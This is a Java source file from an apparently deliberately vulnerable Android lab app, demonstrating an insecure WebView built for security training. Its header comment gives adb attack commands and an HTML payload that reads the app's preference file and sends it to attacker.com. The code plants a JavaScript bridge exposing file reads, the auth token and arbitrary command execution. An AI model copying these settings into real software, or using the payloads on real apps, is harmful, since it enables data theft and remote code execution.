package com.vulnlab.insecureapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * VULNERABILITY 11.8 — Insecure WebView
 *
 * Multiple WebView security failures:
 *   1. JavaScript enabled
 *   2. File access from file:// URIs enabled (read internal app files via XHR)
 *   3. Universal file access from file:// (cross-origin file reads)
 *   4. JavascriptInterface bridge exposes native functionality to JS
 *   5. Attacker-controlled URL loaded from Intent extra (no whitelist)
 *
 * Test:
 *   # Trigger WebView loading an attacker URL
 *   adb shell am start -n com.vulnlab.insecureapp/.WebViewActivity \
 *       --es url "file:///data/data/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml"
 *
 *   # Load XSS payload
 *   adb shell am start -n com.vulnlab.insecureapp/.WebViewActivity \
 *       --es url "javascript:Android.readFile('/data/data/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml')"
 *
 *   # Via intent-filter (ACTION_OPEN_URL)
 *   adb shell am start \
 *       -a com.vulnlab.insecureapp.OPEN_URL \
 *       --es url "file:///etc/hosts"
 *
 * File-read HTML payload to host on attacker server:
 *   <script>
 *     var x=new XMLHttpRequest();
 *     x.open('GET','file:///data/data/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml',false);
 *     x.send();
 *     fetch('http://attacker.com/steal?d='+encodeURIComponent(x.responseText));
 *   </script>
 */
public class WebViewActivity extends Activity {

    private static final String TAG = "VulnLab:WebView";
    private static final String DEFAULT_URL =
            "file:///android_asset/vuln_demo.html";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(16, 16, 16, 16);

        TextView header = new TextView(this);
        header.setText("WebViewActivity — Insecure WebView Demo\n");
        ll.addView(header);

        WebView wv = createVulnerableWebView();
        ll.addView(wv);

        setContentView(ll);

        // VULNERABLE: load URL from Intent extra without validation
        Intent intent = getIntent();
        String url = intent.getStringExtra("url");
        if (url == null) {
            url = intent.getAction() != null && intent.getData() != null
                    ? intent.getData().toString()
                    : DEFAULT_URL;
        }

        Log.w(TAG, "Loading URL from intent: " + url);
        wv.loadUrl(url);
    }

    @SuppressWarnings("SetJavaScriptEnabled")
    private WebView createVulnerableWebView() {
        WebView wv = new WebView(this);
        WebSettings s = wv.getSettings();

        // VULNERABLE settings:
        s.setJavaScriptEnabled(true);                    // enables JS execution
        s.setAllowFileAccess(true);                      // file:// URI access
        s.setAllowFileAccessFromFileURLs(true);          // file:// can XHR other file://
        s.setAllowUniversalAccessFromFileURLs(true);     // file:// can XHR any origin (incl. http)
        s.setSaveFormData(true);                         // credentials cached

        wv.setWebViewClient(new AllowAllWebViewClient());

        // VULNERABLE: JavaScript bridge — exposes Java functionality to ALL web content
        // Pre-API 17: JS can use reflection to reach java.lang.Runtime and get RCE
        wv.addJavascriptInterface(new AppBridge(this), "Android");
        Log.w(TAG, "JavascriptInterface 'Android' registered");

        return wv;
    }

    /**
     * JavaScript bridge — methods annotated @JavascriptInterface are callable from JS.
     * Any page loaded in the WebView can invoke these.
     */
    public static class AppBridge {
        private final Activity activity;
        private static final String TAG = "VulnLab:JSBridge";

        AppBridge(Activity a) { this.activity = a; }

        @JavascriptInterface
        public String readFile(String path) {
            // VULNERABLE: arbitrary file read via JS bridge
            Log.w(TAG, "readFile() called from JS: path=" + path);
            try {
                java.io.File f = new java.io.File(path);
                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(f));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line).append("\n");
                br.close();
                return sb.toString();
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }

        @JavascriptInterface
        public String getAuthToken() {
            // VULNERABLE: exposes auth token to any JS in WebView
            android.content.SharedPreferences prefs = activity
                    .getSharedPreferences(ConfigReceiver.PREFS_NAME, Activity.MODE_PRIVATE);
            String token = prefs.getString("session_token", "no_token");
            Log.w(TAG, "getAuthToken() called from JS, returning: " + token);
            return token;
        }

        @JavascriptInterface
        public String execCommand(String cmd) {
            // VULNERABLE: command execution bridge (for pre-API17 reflection bypass demo)
            // On modern APIs this still exposes arbitrary command execution to trusted JS
            Log.w(TAG, "execCommand() called from JS: " + cmd);
            try {
                Process proc = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(proc.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line).append("\n");
                return sb.toString();
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }
    }

    /** Named static WebViewClient — avoids d8 anonymous-inner-class issues. */
    static class AllowAllWebViewClient extends WebViewClient {
        private static final String TAG = "VulnLab:WebView";

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            // VULNERABLE: no URL validation — all URLs accepted including javascript: URIs
            Log.d(TAG, "shouldOverrideUrlLoading: " + url);
            return false;
        }
    }
}
